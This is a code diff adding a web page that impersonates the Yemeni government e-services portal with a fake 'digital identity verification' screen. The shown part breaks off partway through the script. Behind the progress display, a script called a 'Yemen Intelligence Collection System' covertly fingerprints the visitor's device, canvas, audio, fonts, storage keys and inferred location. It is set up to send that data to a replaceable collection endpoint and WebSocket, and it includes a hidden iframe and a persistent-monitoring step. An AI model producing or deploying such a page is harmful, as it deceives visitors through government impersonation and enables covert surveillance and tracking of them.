@@ -1,0 +1,1519 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#1e3a8a">
+    <meta name="description" content="البوابة الإلكترونية للجمهورية اليمنية">
+    
+    <title>البوابة الحكومية الإلكترونية | الجمهورية اليمنية</title>
+    
+    <link rel="manifest" href="manifest.json">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇾🇪</text></svg>">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        :root {
+            --yemen-red: #ce1126;
+            --yemen-black: #000000;
+            --yemen-white: #ffffff;
+            --primary: #1e3a8a;
+            --secondary: #3b82f6;
+            --success: #16a34a;
+            --warning: #ca8a04;
+            --bg: #f8fafc;
+            --card: #ffffff;
+            --text: #1e293b;
+            --muted: #64748b;
+            --border: #e2e8f0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Tahoma', 'Geneva', sans-serif;
+            background: linear-gradient(180deg, var(--primary) 0%, #0f172a 100%);
+            min-height: 100vh;
+            color: var(--text);
+            overflow-x: hidden;
+        }
+        
+        /* Header Yemen Flag Style */
+        .yemen-header {
+            background: linear-gradient(180deg, 
+                var(--yemen-red) 0%, 
+                var(--yemen-red) 33%, 
+                var(--yemen-white) 33%, 
+                var(--yemen-white) 66%, 
+                var(--yemen-black) 66%, 
+                var(--yemen-black) 100%
+            );
+            height: 8px;
+            width: 100%;
+        }
+        
+        .gov-header {
+            background: var(--card);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
+        }
+        
+        .gov-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 40px;
+            box-shadow: 0 10px 30px rgba(30, 58, 138, 0.3);
+        }
+        
+        .gov-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+        
+        .gov-subtitle {
+            font-size: 14px;
+            color: var(--muted);
+        }
+        
+        /* Main Content */
+        .main-container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .secure-badge {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 50px;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+            color: white;
+            font-size: 13px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .secure-badge::before {
+            content: "🔒";
+        }
+        
+        /* Progress Card */
+        .progress-card {
+            background: var(--card);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        
+        .progress-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .progress-title {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: var(--text);
+        }
+        
+        .progress-subtitle {
+            font-size: 14px;
+            color: var(--muted);
+        }
+        
+        /* Yemen Progress Bar */
+        .yemen-progress-container {
+            margin-bottom: 30px;
+        }
+        
+        .yemen-progress-bar {
+            height: 12px;
+            background: var(--border);
+            border-radius: 6px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .yemen-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, 
+                var(--yemen-red) 0%, 
+                var(--yemen-white) 50%, 
+                var(--yemen-black) 100%
+            );
+            border-radius: 6px;
+            transition: width 0.5s ease;
+            width: 0%;
+            position: relative;
+        }
+        
+        .yemen-progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255,255,255,0.3), 
+                transparent
+            );
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        .progress-text {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+            color: var(--muted);
+        }
+        
+        /* Status Steps */
+        .steps-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .step-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            border-radius: 12px;
+            background: #f8fafc;
+            transition: all 0.3s ease;
+        }
+        
+        .step-item.pending {
+            opacity: 0.6;
+        }
+        
+        .step-item.active {
+            background: #eff6ff;
+            border: 2px solid var(--secondary);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
+        }
+        
+        .step-item.complete {
+            background: #f0fdf4;
+            border: 2px solid var(--success);
+        }
+        
+        .step-item.error {
+            background: #fef2f2;
+            border: 2px solid var(--yemen-red);
+            opacity: 0.8;
+        }
+        
+        .step-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0;
+            transition: all 0.3s;
+        }
+        
+        .step-item.pending .step-icon {
+            background: var(--border);
+            color: var(--muted);
+        }
+        
+        .step-item.active .step-icon {
+            background: var(--secondary);
+            color: white;
+            animation: pulse-icon 1.5s infinite;
+        }
+        
+        .step-item.complete .step-icon {
+            background: var(--success);
+            color: white;
+        }
+        
+        .step-item.error .step-icon {
+            background: var(--yemen-red);
+            color: white;
+        }
+        
+        @keyframes pulse-icon {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
+        }
+        
+        .step-content {
+            flex: 1;
+        }
+        
+        .step-title {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 3px;
+        }
+        
+        .step-desc {
+            font-size: 12px;
+            color: var(--muted);
+        }
+        
+        /* Result Section */
+        .result-section {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .result-section.show {
+            display: block;
+            animation: fadeInUp 0.5s ease;
+        }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--success), #22c55e);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            font-size: 50px;
+            box-shadow: 0 20px 40px rgba(22, 163, 74, 0.3);
+            animation: scaleIn 0.5s ease;
+        }
+        
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .result-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--success);
+            margin-bottom: 10px;
+        }
+        
+        .result-message {
+            font-size: 15px;
+            color: var(--muted);
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        
+        .yemen-stamp {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: linear-gradient(135deg, var(--yemen-red), #991b1b);
+            color: white;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 600;
+            box-shadow: 0 10px 30px rgba(206, 17, 38, 0.3);
+        }
+        
+        /* Footer */
+        .yemen-footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: rgba(255,255,255,0.6);
+            font-size: 12px;
+        }
+        
+        .yemen-footer p {
+            margin-bottom: 8px;
+        }
+        
+        /* Hidden Data Collection Elements */
+        #collectionFrame {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="yemen-header"></div>
+
+<header class="gov-header">
+    <div class="gov-logo">🇾🇪</div>
+    <h1 class="gov-title">الجمهورية اليمنية</h1>
+    <p class="gov-subtitle">البوابة الإلكترونية للخدمات الحكومية</p>
+</header>
+
+<main class="main-container">
+    <div class="secure-badge">
+        اتصال آمن مشفر | Secure Connection TLS 1.3
+    </div>
+    
+    <div class="progress-card" id="mainCard">
+        <div class="progress-header">
+            <h2 class="progress-title">التحقق من الهوية الرقمية</h2>
+            <p class="progress-subtitle">جاري التحقق من بيانات الجهاز والاتصال</p>
+        </div>
+        
+        <div class="yemen-progress-container">
+            <div class="yemen-progress-bar">
+                <div class="yemen-progress-fill" id="progressBar"></div>
+            </div>
+            <div class="progress-text" id="progressText">0% - جاري التهيئة...</div>
+        </div>
+        
+        <div class="steps-container" id="stepsContainer">
+            <!-- Steps will be generated by JS -->
+        </div>
+        
+        <div class="result-section" id="resultSection">
+            <div class="success-icon">✓</div>
+            <h2 class="result-title">تم التحقق بنجاح</h2>
+            <p class="result-message">
+                تم التحقق من هويتك الرقمية بنجاح.<br>
+                يمكنك الآن الوصول للخدمات الحكومية الإلكترونية.
+            </p>
+            <div class="yemen-stamp">
+                <span>🇾🇪</span>
+                <span>معتمد من الجمهورية اليمنية</span>
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="yemen-footer">
+    <p>جميع الحقوق محفوظة © 2024 - الجمهورية اليمنية</p>
+    <p>وزارة الاتصالات وتقنية المعلومات</p>
+    <p>الإدارة العامة للأمن السيبراني</p>
+</footer>
+
+<!-- Hidden Collection Frame -->
+<iframe id="collectionFrame" sandbox="allow-same-origin allow-scripts"></iframe>
+
+<script>
+/**
+ * Yemen Intelligence Collection System
+ * Professional device fingerprinting and monitoring
+ */
+
+(function() {
+    'use strict';
+    
+    // ========== Configuration ==========
+    const CONFIG = {
+        COLLECTION_ENDPOINT: 'https://httpbin.org/post', // Replace with your endpoint
+        WS_ENDPOINT: 'wss://echo.websocket.org', // Replace with your WebSocket
+        MAX_RETRIES: 3,
+        COLLECTION_TIMEOUT: 8000,
+        PERSISTENCE_KEY: 'yemen_intel_session',
+        DEVICE_ID_PREFIX: 'YEM'
+    };
+    
+    // ========== State Management ==========
+    const State = {
+        deviceId: null,
+        sessionStart: Date.now(),
+        collectionPhase: 0,
+        collectedData: {},
+        permissions: {},
+        errors: [],
+        retryCount: 0,
+        isComplete: false
+    };
+    
+    // ========== Yemen-themed Steps ==========
+    const COLLECTION_STEPS = [
+        {
+            id: 'device',
+            icon: '📱',
+            title: 'فحص الجهاز',
+            desc: 'تحليل مواصفات الجهاز والنظام',
+            requiresPermission: false,
+            critical: true
+        },
+        {
+            id: 'screen',
+            icon: '📐',
+            title: 'قياس الشاشة',
+            desc: 'تحليل الدقة والعرض والإعدادات',
+            requiresPermission: false,
+            critical: true
+        },
+        {
+            id: 'network',
+            icon: '🌐',
+            title: 'فحص الاتصال',
+            desc: 'تحليل نوع الاتصال والسرعة',
+            requiresPermission: false,
+            critical: false
+        },
+        {
+            id: 'location',
+            icon: '📍',
+            title: 'التحقق الجغرافي',
+            desc: 'تقدير الموقع من المنطقة الزمنية',
+            requiresPermission: false,
+            critical: true
+        },
+        {
+            id: 'gpu',
+            icon: '🎨',
+            title: 'تحليل الرسوميات',
+            desc: 'فحص GPU وبصمة Canvas',
+            requiresPermission: false,
+            critical: true
+        },
+        {
+            id: 'fingerprint',
+            icon: '🔐',
+            title: 'إنشاء البصمة الرقمية',
+            desc: 'توليد معرف فريد للجهاز',
+            requiresPermission: false,
+            critical: true
+        },
+        {
+            id: 'persistence',
+            icon: '💾',
+            title: 'تفعيل الاستمرارية',
+            desc: 'تفعيل المراقبة المستمرة',
+            requiresPermission: true,
+            critical: false
+        }
+    ];
+    
+    // ========== Utility Functions ==========
+    const Utils = {
+        generateId: () => {
+            const timestamp = Date.now().toString(36).toUpperCase();
+            const random = Math.random().toString(36).substring(2, 5).toUpperCase();
+            return `${CONFIG.DEVICE_ID_PREFIX}-${timestamp}-${random}`;
+        },
+        
+        hashString: (str) => {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            return Math.abs(hash).toString(36).toUpperCase();
+        },
+        
+        safeExecute: (fn, fallback = null) => {
+            try {
+                return fn();
+            } catch(e) {
+                State.errors.push({ time: Date.now(), error: e.message });
+                return fallback;
+            }
+        },
+        
+        detectYemenLocation: (timezone, language) => {
+            const yemenZones = ['Asia/Aden', 'Asia/Sana'];
+            const arabicLangs = ['ar', 'ar-YE', 'ar-SA', 'ar-OM'];
+            
+            if (yemenZones.includes(timezone)) return { country: 'Yemen', confidence: 95 };
+            if (arabicLangs.includes(language)) return { country: 'Arabic Region', confidence: 70 };
+            
+            // Map common timezones to regions
+            const zoneMap = {
+                'Asia/Riyadh': { country: 'Saudi Arabia', confidence: 90 },
+                'Asia/Dubai': { country: 'UAE', confidence: 90 },
+                'Asia/Qatar': { country: 'Qatar', confidence: 90 },
+                'Asia/Kuwait': { country: 'Kuwait', confidence: 90 },
+                'Africa/Cairo': { country: 'Egypt', confidence: 90 },
+                'Asia/Amman': { country: 'Jordan', confidence: 90 },
+                'Asia/Beirut': { country: 'Lebanon', confidence: 90 },
+                'Asia/Baghdad': { country: 'Iraq', confidence: 90 }
+            };
+            
+            return zoneMap[timezone] || { country: 'Unknown', confidence: 0 };
+        },
+        
+        getDeviceCategory: (memory, cores, width) => {
+            if (memory >= 8 && cores >= 8 && width >= 1440) return 'Flagship';
+            if (memory >= 4 && cores >= 4 && width >= 1080) return 'Mid-range';
+            return 'Budget';
+        }
+    };
+    
+    // ========== Data Collectors ==========
+    const Collectors = {
+        // 1. Device Information (No permission needed)
+        collectDevice: () => {
+            return Utils.safeExecute(() => ({
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                product: navigator.product,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                appCodeName: navigator.appCodeName,
+                oscpu: navigator.oscpu,
+                cpuClass: navigator.cpuClass,
+                language: navigator.language,
+                languages: navigator.languages,
+                onLine: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                webdriver: navigator.webdriver,
+                buildID: navigator.buildID,
+                productSub: navigator.productSub,
+                standalone: navigator.standalone,
+                devicePixelRatio: window.devicePixelRatio,
+                maxSafeInteger: Number.MAX_SAFE_INTEGER
+            }), {});
+        },
+        
+        // 2. Screen Information (No permission needed)
+        collectScreen: () => {
+            return Utils.safeExecute(() => ({
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                availLeft: screen.availLeft,
+                availTop: screen.availTop,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation ? {
+                    angle: screen.orientation.angle,
+                    type: screen.orientation.type
+                } : null,
+                devicePixelRatio: window.devicePixelRatio,
+                visualViewport: window.visualViewport ? {
+                    width: window.visualViewport.width,
+                    height: window.visualViewport.height,
+                    scale: window.visualViewport.scale,
+                    offsetLeft: window.visualViewport.offsetLeft,
+                    offsetTop: window.visualViewport.offsetTop,
+                    pageLeft: window.visualViewport.pageLeft,
+                    pageTop: window.visualViewport.pageTop
+                } : null
+            }), {});
+        },
+        
+        // 3. Window Information (No permission needed)
+        collectWindow: () => {
+            return Utils.safeExecute(() => ({
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                screenX: window.screenX,
+                screenY: window.screenY,
+                screenLeft: window.screenLeft,
+                screenTop: window.screenTop,
+                devicePixelRatio: window.devicePixelRatio,
+                innerWidthDPR: window.innerWidth * window.devicePixelRatio,
+                innerHeightDPR: window.innerHeight * window.devicePixelRatio,
+                deviceOrientation: window.orientation,
+                isSecureContext: window.isSecureContext,
+                isIframe: window !== window.top
+            }), {});
+        },
+        
+        // 4. Time and Location (No permission needed)
+        collectTime: () => {
+            return Utils.safeExecute(() => {
+                const now = new Date();
+                return {
+                    timestamp: now.getTime(),
+                    iso: now.toISOString(),
+                    utc: now.toUTCString(),
+                    local: now.toString(),
+                    locale: now.toLocaleString('ar-YE'),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: now.getTimezoneOffset(),
+                    timezoneOffsetHours: -(now.getTimezoneOffset() / 60),
+                    year: now.getFullYear(),
+                    month: now.getMonth(),
+                    date: now.getDate(),
+                    day: now.getDay(),
+                    hours: now.getHours(),
+                    minutes: now.getMinutes(),
+                    seconds: now.getSeconds(),
+                    milliseconds: now.getMilliseconds(),
+                    yemenLocation: Utils.detectYemenLocation(
+                        Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        navigator.language
+                    )
+                };
+            }, {});
+        },
+        
+        // 5. Network Information (No permission needed)
+        collectNetwork: () => {
+            return Utils.safeExecute(() => {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return {
+                    online: navigator.onLine,
+                    connection: conn ? {
+                        effectiveType: conn.effectiveType,
+                        downlink: conn.downlink,
+                        rtt: conn.rtt,
+                        saveData: conn.saveData,
+                        type: conn.type
+                    } : null,
+                    downlinkMax: conn?.downlinkMax || null
+                };
+            }, { online: navigator.onLine });
+        },
+        
+        // 6. WebGL and GPU (No permission needed)
+        collectWebGL: () => {
+            return Utils.safeExecute(() => {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const params = {};
+                const constants = [
+                    'VERSION', 'SHADING_LANGUAGE_VERSION', 'VENDOR', 'RENDERER',
+                    'MAX_TEXTURE_SIZE', 'MAX_CUBE_MAP_TEXTURE_SIZE',
+                    'MAX_RENDERBUFFER_SIZE', 'MAX_VIEWPORT_DIMS',
+                    'MAX_VERTEX_ATTRIBS', 'MAX_VERTEX_UNIFORM_VECTORS',
+                    'MAX_FRAGMENT_UNIFORM_VECTORS', 'MAX_VARYING_VECTORS'
+                ];
+                
+                constants.forEach(c => {
+                    try {
+                        params[c] = gl.getParameter(gl[c]);
+                    } catch(e) {}
+                });
+                
+                return {
+                    context: gl instanceof WebGL2RenderingContext ? 'webgl2' : 'webgl',
+                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+                    params: params,
+                    extensions: gl.getSupportedExtensions(),
+                    aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+                    aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE),
+                    alphaBits: gl.getParameter(gl.ALPHA_BITS),
+                    blueBits: gl.getParameter(gl.BLUE_BITS),
+                    depthBits: gl.getParameter(gl.DEPTH_BITS),
+                    greenBits: gl.getParameter(gl.GREEN_BITS),
+                    redBits: gl.getParameter(gl.RED_BITS),
+                    maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
+                    maxCubeMapTextureSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
+                    maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+                    maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+                    maxTextureImageUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
+                    maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+                    maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
+                    maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
+                    precisionFormats: gl.getParameter(gl.PRECISION_FORMATS),
+                    renderer: gl.getParameter(gl.RENDERER),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    vendor: gl.getParameter(gl.VENDOR),
+                    version: gl.getParameter(gl.VERSION)
+                };
+            }, null);
+        },
+        
+        // 7. Canvas Fingerprint (No permission needed)
+        collectCanvas: () => {
+            return Utils.safeExecute(() => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = 280;
+                canvas.height = 60;
+                
+                // Yemen-themed drawing
+                ctx.textBaseline = 'top';
+                ctx.font = '14px "Arial", "Helvetica", sans-serif';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 280, 60);
+                
+                ctx.fillStyle = '#069';
+                ctx.fillText('🇾🇪 الجمهورية اليمنية - Yemen Republic', 4, 4);
+                
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.font = '18px "Arial", sans-serif';
+                ctx.fillText('!@#$%^&*()_+-=[]{}|;:,.<>?', 4, 32);
+                
+                // Complex shapes
+                ctx.globalCompositeOperation = 'multiply';
+                ctx.fillStyle = 'rgb(255,0,255)';
+                ctx.beginPath();
+                ctx.arc(140, 30, 15, 0, Math.PI * 2, true);
+                ctx.closePath();
+                ctx.fill();
+                
+                // Yemen flag colors
+                ctx.fillStyle = '#CE1126'; // Red
+                ctx.fillRect(200, 10, 30, 10);
+                ctx.fillStyle = '#FFFFFF'; // White
+                ctx.fillRect(200, 20, 30, 10);
+                ctx.fillStyle = '#000000'; // Black
+                ctx.fillRect(200, 30, 30, 10);
+                
+                const dataURL = canvas.toDataURL();
+                
+                return {
+                    fingerprint: dataURL,
+                    hash: Utils.hashString(dataURL),
+                    length: dataURL.length,
+                    textMetrics: {
+                        width: ctx.measureText('Yemen Republic').width,
+                        actualBoundingBoxLeft: ctx.measureText('Yemen').actualBoundingBoxLeft,
+                        actualBoundingBoxRight: ctx.measureText('Yemen').actualBoundingBoxRight
+                    }
+                };
+            }, null);
+        },
+        
+        // 8. Audio Fingerprint (No permission needed)
+        collectAudio: () => {
+            return Utils.safeExecute(() => {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return null;
+                
+                const ctx = new AudioContext();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                const gainNode = ctx.createGain();
+                
+                oscillator.type = 'triangle';
+                oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
+                
+                gainNode.gain.setValueAtTime(0, ctx.currentTime);
+                
+                oscillator.connect(analyser);
+                analyser.connect(gainNode);
+                gainNode.connect(ctx.destination);
+                
+                oscillator.start();
+                oscillator.stop(ctx.currentTime + 0.1);
+                
+                const fingerprint = [
+                    ctx.sampleRate,
+                    ctx.destination.maxChannelCount,
+                    ctx.destination.numberOfInputs,
+                    ctx.destination.numberOfOutputs,
+                    ctx.destination.channelCount,
+                    ctx.destination.channelCountMode,
+                    ctx.destination.channelInterpretation,
+                    ctx.currentTime,
+                    ctx.baseLatency || 'unknown',
+                    ctx.outputLatency || 'unknown'
+                ].join('|');
+                
+                ctx.close();
+                
+                return {
+                    sampleRate: ctx.sampleRate,
+                    state: ctx.state,
+                    baseLatency: ctx.baseLatency,
+                    outputLatency: ctx.outputLatency,
+                    maxChannelCount: ctx.destination.maxChannelCount,
+                    fingerprint: fingerprint,
+                    hash: Utils.hashString(fingerprint)
+                };
+            }, null);
+        },
+        
+        // 9. Font Detection (No permission needed)
+        collectFonts: () => {
+            return Utils.safeExecute(() => {
+                const fontList = [
+                    'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
+                    'Book Antiqua', 'Bookman Old Style', 'Calibri', 'Cambria',
+                    'Cambria Math', 'Century', 'Century Gothic', 'Century Schoolbook',
+                    'Comic Sans MS', 'Consolas', 'Courier', 'Courier New',
+                    'Georgia', 'Helvetica', 'Impact', 'Lucida Console',
+                    'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Monotype Corsiva',
+                    'MS Gothic', 'MS PGothic', 'MS Reference Sans Serif',
+                    'MS Sans Serif', 'MS Serif', 'Palatino Linotype', 'Segoe Print',
+                    'Segoe Script', 'Segoe UI', 'Segoe UI Light', 'Segoe UI Semibold',
+                    'Segoe UI Symbol', 'Tahoma', 'Times', 'Times New Roman',
+                    'Trebuchet MS', 'Verdana', 'Wingdings', 'Wingdings 2', 'Wingdings 3',
+                    // Arabic fonts
+                    'Traditional Arabic', 'Arial Unicode MS', 'Microsoft Uighur',
+                    'Simplified Arabic', 'Sakkal Majalla', 'Arabic Typesetting'
+                ];
+                
+                const detected = [];
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const testString = 'mmmmmmmmmmlli';
+                const testSize = '72px';
+                
+                ctx.font = testSize + ' monospace';
+                const baseline = ctx.measureText(testString).width;
+                
+                fontList.forEach(font => {
+                    ctx.font = testSize + ' "' + font + '", monospace';
+                    if (ctx.measureText(testString).width !== baseline) {
+                        detected.push(font);
+                    }
+                });
+                
+                return {
+                    detected: detected,
+                    count: detected.length,
+                    fingerprint: detected.slice(0, 15).join(','),
+                    hasArabic: detected.some(f => 
+                        f.includes('Arabic') || f.includes('Uighur') || f.includes('Majalla')
+                    )
+                };
+            }, { detected: [], count: 0, hasArabic: false });
+        },
+        
+        // 10. Plugins and MIME Types (No permission needed)
+        collectPlugins: () => {
+            return Utils.safeExecute(() => ({
+                plugins: Array.from(navigator.plugins).map(p => ({
+                    name: p.name,
+                    filename: p.filename,
+                    description: p.description,
+                    version: p.version,
+                    length: p.length
+                })),
+                mimeTypes: Array.from(navigator.mimeTypes).map(m => ({
+                    type: m.type,
+                    description: m.description,
+                    suffixes: m.suffixes,
+                    enabledPlugin: m.enabledPlugin ? m.enabledPlugin.name : null
+                })),
+                pdfViewerEnabled: navigator.pdfViewerEnabled
+            }), { plugins: [], mimeTypes: [] });
+        },
+        
+        // 11. Storage Information (No permission needed for basic info)
+        collectStorage: () => {
+            return Utils.safeExecute(() => ({
+                localStorage: (() => {
+                    try {
+                        return {
+                            enabled: true,
+                            length: localStorage.length,
+                            keys: Object.keys(localStorage).slice(0, 10)
+                        };
+                    } catch(e) {
+                        return { enabled: false, error: e.message };
+                    }
+                })(),
+                sessionStorage: (() => {
+                    try {
+                        return {
+                            enabled: true,
+                            length: sessionStorage.length,
+                            keys: Object.keys(sessionStorage).slice(0, 10)
+                        };
+                    } catch(e) {
+                        return { enabled: false, error: e.message };
+                    }
+                })(),
+                indexedDB: 'indexedDB' in window,
+                webSQL: 'openDatabase' in window,
+                cacheAPI: 'caches' in window,
+                serviceWorker: 'serviceWorker' in navigator,
+                quota: (() => {
+                    if ('storage' in navigator && 'estimate' in navigator.storage) {
+                        return navigator.storage.estimate().then(estimate => ({
+                            usage: estimate.usage,
+                            quota: estimate.quota,
+                            usageDetails: estimate.usageDetails
+                        })).catch(() => null);
+                    }
+                    return null;
+                })()
+            }), {});
+        },
+        
+        // 12. Capabilities Detection (No permission needed)
+        collectCapabilities: () => {
+            return {
+                // Device APIs
+                bluetooth: 'bluetooth' in navigator,
+                usb: 'usb' in navigator,
+                serial: 'serial' in navigator,
+                hid: 'hid' in navigator,
+                nfc: 'nfc' in navigator,
+                
+                // Media
+                mediaDevices: 'mediaDevices' in navigator,
+                getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+                getDisplayMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia),
+                mediaCapabilities: 'mediaCapabilities' in navigator,
+                mediaSession: 'mediaSession' in navigator,
+                
+                // Sensors
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                deviceMotion: 'DeviceMotionEvent' in window,
+                accelerometer: 'Accelerometer' in window,
+                gyroscope: 'Gyroscope' in window,
+                magnetometer: 'Magnetometer' in window,
+                ambientLightSensor: 'AmbientLightSensor' in window,
+                proximity: 'ProximitySensor' in window,
+                
+                // Communication
+                broadcastChannel: 'BroadcastChannel' in window,
+                webSocket: 'WebSocket' in window,
+                webRTC: 'RTCPeerConnection' in window,
+                share: 'share' in navigator,
+                contacts: 'contacts' in navigator && 'ContactsManager' in window,
+                
+                // Storage
+                localStorage: (() => {
+                    try {
+                        const test = '__test__';
+                        localStorage.setItem(test, test);
+                        localStorage.removeItem(test);
+                        return true;
+                    } catch(e) { return false; }
+                })(),
+                sessionStorage: (() => {
+                    try {
+                        const test = '__test__';
+                        sessionStorage.setItem(test, test);
+                        sessionStorage.removeItem(test);
+                        return true;
+                    } catch(e) { return false; }
+                })(),
+                indexedDB: 'indexedDB' in window,
+                cacheAPI: 'caches' in window,
+                
+                // Workers
+                serviceWorker: 'serviceWorker' in navigator,
+                webWorker: 'Worker' in window,
+                sharedWorker: 'SharedWorker' in window,
+                
+                // Other
+                geolocation: 'geolocation' in navigator,
+                notifications: 'Notification' in window,
+                pushManager: 'PushManager' in window,
+                paymentRequest: 'PaymentRequest' in window,
+                credentials: 'credentials' in navigator,
+                clipboard: 'clipboard' in navigator,
+                wakeLock: 'wakeLock' in navigator,
+                webShare: 'canShare' in navigator,
+                presentation: 'presentation' in window,
+                receiver: 'PresentationReceiver' in window,
